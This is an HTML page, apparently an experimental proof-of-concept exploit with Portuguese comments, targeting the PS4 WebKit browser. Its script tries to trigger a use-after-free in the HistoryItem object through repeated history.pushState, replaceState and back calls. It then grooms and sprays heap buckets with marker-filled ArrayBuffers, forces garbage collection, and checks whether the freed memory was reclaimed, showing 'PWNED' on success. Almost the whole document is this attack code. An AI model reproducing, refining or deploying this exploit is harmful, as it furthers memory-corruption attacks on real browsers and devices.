<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Bucket Shotgun</title>
<style>
    body { background-color: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0f0; background: #003300; color: #fff;
    }
    #log { border: 1px solid #333; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .pwned { background-color: #fff; color: #000; font-size: 1.5em; font-weight: bold; }
</style>
</head>
<body>
<h2>PS4 WebKit - Multi-Bucket Reclaim</h2>
<div id="status">Alvo: HistoryItem (0x50) + Variações</div>
<button onclick="runShotgunExploit()">INICIAR RECLAIM (BUCKET SHOTGUN)</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { 
    const d = document.createElement("div");
    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// Armazena os objetos para impedir o GC de limpar
var keepAlive = [];

// Helper para criar Fake Objects visualmente identificáveis
function createFakeObject(size, marker) {
    try {
        let buf = new ArrayBuffer(size);
        let view = new Uint32Array(buf);
        // Preenche com o marcador (ex: 0x41414141)
        for(let i=0; i<view.length; i++) {
            view[i] = marker;
        }
        return buf;
    } catch(e) { return null; }
}

async function runShotgunExploit() {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = "Preparando...";

    // === DEFINIÇÃO DOS BUCKETS ===
    // O alvo é 80 bytes. Vamos atacar os vizinhos de alocação.
    const BUCKETS = [
        { size: 80,  marker: 0x41414141 }, // 'AAAA' (Alvo exato)
        { size: 96,  marker: 0x42424242 }, // 'BBBB' (Header +16)
        { size: 64,  marker: 0x43434343 }, // 'CCCC' (Menor)
        { size: 128, marker: 0x44444444 }  // 'DDDD' (Maior)
    ];

    log("1. Preparando Grooming (Pré-alocação)...");
    // Aloca alguns objetos de cada tamanho para "aquecer" os buckets do bmalloc
    for(let b of BUCKETS) {
        for(let k=0; k<100; k++) keepAlive.push(createFakeObject(b.size, b.marker));
    }
    
    // Libera 25% deles para criar buracos (Swiss Cheese)
    // Isso ajuda o UAF a cair num lugar conhecido
    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);

    // === TRIGGER UAF ===
    log("2. Disparando UAF (Loop 48)...");
    
    let size = 977;
    const STEP = 14461;

    // Loop corrigido para 48 (o 64 causava crash por exaustão)
    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // MOMENTO CRÍTICO (Iteração final)
        if (i === 47) {
            log(">>> SPRAY MULTI-BUCKET <<<");
            
            // 1. Libera o HistoryItem
            setTimeout(() => history.back(), 0);
            
            // 2. Spray Imediato de TODOS os tamanhos
            // Isso aumenta drasticamente a chance de acertar o bucket correto
            doShotgunSpray(BUCKETS);
            
            // 3. Force GC (Crucial do psfree.mjs)
            setTimeout(() => forceGC(), 20); 
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(400); // Espera o pó baixar
    checkResult();
}

function doShotgunSpray(buckets) {
    // Aloca 200 objetos de CADA tamanho
    // Total: ~800 objetos injetados no milissegundo crítico
    for(let k=0; k<200; k++) {
        for(let b of buckets) {
            keepAlive.push(createFakeObject(b.size, b.marker));
        }
    }
}

function forceGC() {
    // Pressão de memória para limpar o lixo e validar o spray
    for (let i = 0; i < 4; i++) new ArrayBuffer(8 * 1024 * 1024);
}

function checkResult() {
    statusEl.innerText = "Analisando Memória...";
    let url = document.URL;
    let found = false;
    let markerFound = "";
    
    // Procura pelos nossos marcadores na URL
    // Se o HistoryItem (container) foi sobrescrito, o ponteiro da string agora
    // aponta para 0x41414141 (endereço inválido -> CRASH) ou dados lidos do nosso buffer.
    
    for(let i=0; i < url.length && i < 5000; i++) {
        let c = url.charCodeAt(i);
        if(c === 0x41) { found = true; markerFound = "AAAA (80 bytes)"; break; }
        if(c === 0x42) { found = true; markerFound = "BBBB (96 bytes)"; break; }
        if(c === 0x43) { found = true; markerFound = "CCCC (64 bytes)"; break; }
        if(c === 0x44) { found = true; markerFound = "DDDD (128 bytes)"; break; }
    }

    if(found) {
        log("!!! SUCESSO !!!");
        log(`Bucket Vencedor: ${markerFound}`);
        statusEl.innerText = "PWNED";
        statusEl.className = "pwned";
    } else {
        // Se ainda for V, verifica se o navegador está instável
        log("Status: Objeto intacto ('V').");
        log("Nota: Se o console crashar nos próximos segundos, o tamanho de 80 bytes funcionou (Crash = Sucesso de Escrita).");
    }
}
</script>
</body>
</html>
